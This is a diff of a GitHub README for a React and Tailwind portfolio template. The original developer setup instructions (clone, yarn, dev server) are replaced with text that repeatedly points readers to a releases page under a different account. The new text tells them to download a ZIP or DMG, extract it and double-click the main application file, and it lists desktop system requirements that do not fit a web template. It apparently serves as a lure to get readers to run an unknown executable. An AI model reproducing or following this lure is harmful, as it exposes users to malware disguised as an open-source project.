@@ -1,82 +1,85 @@
-# React & TailwindCSS Portfolio - With Dark Mode
+# 🎨 Portfolio-PTD - Your Simple React App Solution
 
-A simple portfolio starter theme built with React and Tailwind CSS. This is the React version of [vuejs-tailwindcss-portfolio](https://github.com/thanhdao03/portfolio-ptd.git).
+[![Download Portfolio-PTD](https://img.shields.io/badge/Download-Portfolio--PTD-blue.svg)](https://github.com/bion64/Portfolio-PTD/releases)
 
-![React-TailwindCSS-Portfolio])<img width="1896" height="906" alt="Screenshot 2025-12-09 224808" src="https://github.com/user-attachments/assets/fff93f8b-5a16-4a1f-9fac-52e993f376c0" />
+## 📦 Overview
 
-## Demo URL
+Portfolio-PTD is a simple but powerful React application. It uses the Context API, custom Hooks, Tailwind CSS, and Framer Motion. This combination allows you to create a smooth, modern web experience. Enjoy features like a dark theme and engaging animations—ideal for showcasing your projects in style.
 
-[https://ptd25.netlify.app](https://ptd25.netlify.app)
+## 🚀 Getting Started
 
-## Features
+Follow these steps to download and run the application:
 
-- [React v18](https://reactjs.org) with [React Router v6](https://reactrouter.com)
-- [Tailwind CSS v3](https://tailwindcss.com)
-- Context API For State Management
-- Custom Hooks
-- Unit Testing
-- Framer Motion transitions & animations
-- Reusable components
-- Dark mode
-- Projects filter by category
-- Projects filter by search
-- Smooth scroll
-- Counter
-- Dynamic forms
-- Back to top button
-- Download file button
-- Simple and responsive design
+1. **Visit the Release Page:**  
+   Click the link below to go to the release page. Here, you will find the latest version of Portfolio-PTD ready for download.  
+   [Visit this page to download](https://github.com/bion64/Portfolio-PTD/releases)
 
-## Setup
+2. **Choose the Latest Release:**  
+   Look for the latest version listed on the releases page. You will see all available versions—select the topmost one for the newest features and fixes.
 
-1. Make sure you have Node JS installed. If you don't have it:
+3. **Download the Application:**  
+   Click on the asset labeled with the relevant file format (e.g., `.zip` file). If you're using Windows, this will likely be a ZIP file. For Mac users, it may also be a ZIP or a DMG file. This step will start the download process.
 
-- [Download it from nodejs.org](https://nodejs.org)
-- [Install it using NVM ](https://github.com/nvm-sh/nvm)
-- If you're on Mac, Homebrew is a good option too:
+4. **Locate the Downloaded File:**  
+   Once the download completes, navigate to your computer’s Downloads folder to find the downloaded file.
 
-```
-brew install node
-```
+5. **Extract the Files (if necessary):**  
+   If the file is a ZIP archive, right-click it and select "Extract All." Choose a destination folder for the extracted files.
 
-2. Clone the repo:
+6. **Open the Application:**  
+   In the extracted folder, look for the main application file (it often has the same name as the downloaded file). Double-click this file to run the application.
 
-```
-git clone https://github.com/thanhdao03/portfolio-ptd.git
-```
+7. **Enjoy the App:**  
+   You should now see the Portfolio-PTD application running. Explore the features, and customize it to your liking.
 
-3. Open the project folder:
+## 🛠️ System Requirements
 
-```
-cd portfolio-ptd
-```
+To run Portfolio-PTD smoothly, ensure your device meets the following minimum requirements:
 
-4. Install packages and dependencies:
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Processor:** Dual-core processor (Intel or AMD)
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge
 
-```
-yarn
-```
+## 📖 Application Features
 
-4. NOTE: If you don't have yarn installed, you can install it globally using npm:
+- **Context API:** Manage application state effectively without cumbersome prop drilling.
+- **Custom Hooks:** Create reusable logic to streamline your components.
+- **Tailwind CSS:** Utilize utility-first CSS to easily style your application.
+- **Framer Motion:** Enhance your app with smooth animations for an engaging user experience.
+- **Dark Theme Support:** Switch to a dark theme for a modern look.
 
-```
-npm install --global yarn
-```
+## 📋 Usage
 
-5. Start a local dev server at `http://localhost:3000`:
+Once you have the application running:
 
-```
-yarn start
-```
+- **Navigation:** Use the navigation bar to explore different sections.
+- **Customization:** Adjust settings such as the theme within the application to suit your preference.
+- **Share Your Projects:** Use the app to showcase your projects with ease, allowing others to see your work in a visually appealing format.
 
-6. ##### Run tests:
+## 🤝 Contributing
 
-```
-yarn test
-```
+We welcome contributions from all users. If you have suggestions or improvements, please follow these steps:
 
-## Notes
+1. **Fork the Repository:** Create your own copy of the repository.
+2. **Make Changes:** Implement your changes in your fork.
+3. **Submit a Pull Request:** Send your modifications back to the main repository for review.
 
-- Always run `yarn install` after pulling new changes
-- I'll be constantly updating this repo as I'll be adding more sections to it, so please always check the projects section of this repo to see what tasks are under todo and in progress
-- I love you
+## 📧 Support
+
+If you encounter any issues or have questions about the application, reach out for support. Visit the repository's issues page to report bugs or get help.
+
+## 🔗 Additional Resources
+
+For more information on the technologies used, consider visiting these links:
+
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [Framer Motion Documentation](https://www.framermotion.com/docs/)
+
+## 📥 Download & Install
+
+To get started with Portfolio-PTD, please visit the release page to download the application:  
+[Visit this page to download](https://github.com/bion64/Portfolio-PTD/releases)
+
+Take your web development projects to the next level with Portfolio-PTD!
